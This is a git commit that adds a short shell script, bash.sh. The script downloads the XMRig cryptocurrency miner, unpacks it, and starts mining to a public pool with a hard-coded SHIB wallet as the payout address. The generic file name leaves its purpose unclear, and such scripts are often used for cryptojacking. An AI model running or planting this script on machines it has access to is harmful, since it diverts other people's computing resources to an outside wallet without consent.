151e08bfa746e7e02c6b1d3eaacd32e35c29b351
aggoxsteam <74939363+aggoxsteam@users.noreply.github.com>
2022-04-23 17:53:50 +0200

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar -xf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+./xmrig -o rx.unmineable.com:3333 -u SHIB:0xA3162F7204bCF8784246936659C6B7B3D0636d38.shib -p x
